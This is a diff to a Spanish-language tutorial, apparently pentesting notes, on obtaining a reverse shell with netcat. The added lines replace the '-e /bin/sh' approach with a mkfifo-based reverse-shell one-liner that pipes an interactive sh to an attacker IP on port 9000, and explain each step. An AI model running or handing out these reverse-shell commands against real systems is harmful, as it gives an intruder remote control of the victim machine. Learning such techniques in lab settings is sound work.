@@ -46,6 +46,13 @@ Para obtner la shell reversa, usaremos netcat tanto en el atacante (kali) como e
   ```
   nc [IP del atacante] [puerto] -e /bin/sh
   ```
-  e: para ejecutar una shell reversa. También podríamos usar la opcioin -c
-Tras establecer la conexión, podrás ejecutar comandos en la máquina objetivo desde la máquina atacante.
-En la máquina atacante se arranca netcat en modo escucha para experar la conexión del cliente.
+  e: para ejecutar una shell reversa. También podríamos usar la opcioin -c. Sin embargo la opcion -e ó -c no estan disponibles en la version tradicional de netcat, sino que pertenecen a ncat. Por tanto, al usarlas devolverá un error.
+
+  En su lugar hay que emplear los ficheros FIFO o named pipe, que son un tipo especial de fichero en linux, que permite enviar datos entre procesos, muy similar a las tuberías o pipes. Para crear un fichero FIFO se emplea el comando mkfifo ➡
+  ```
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc 192.168.1.103 9000 > /tmp/f
+  ```
+  Este comando crea un canal de comunicación bidireccional entre la máquina víctima y la atacante, usando un archivo FIFO en /tmp/f. Primero, elimina /tmp/f si existe y luego crea un FIFO con mkfifo. Utiliza cat para leer este FIFO y pasa la salida a sh -i, creando una shell interactiva que redirige tanto la entrada estándar como la salida estándar y el error estándar a través de Netcat hacia la dirección IP 192.168.1.103 en el puerto 9000. Finalmente, la salida de Netcat se redirige de nuevo al FIFO, completando el circuito para la comunicación bidireccional.
+
+- Tras establecer la conexión, posremos ejecutar comandos en la máquina objetivo desde la máquina atacante.
+
